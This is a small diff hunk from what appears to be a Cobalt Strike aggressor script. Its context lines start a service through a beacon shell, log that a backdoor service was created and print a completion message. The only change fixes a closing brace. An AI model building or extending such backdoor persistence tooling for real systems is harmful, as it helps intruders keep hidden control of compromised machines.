@@ -35,7 +35,7 @@ popup beacon_bottom {
 					bshell($1, "sc start $serviceName ");
 					blog($1, "Backdoor service created using $servicebackdoorfilename ");
 					println("\c9[+] Backdoor creation complete!");
-				}
+				});
 			}
 		}
 	}
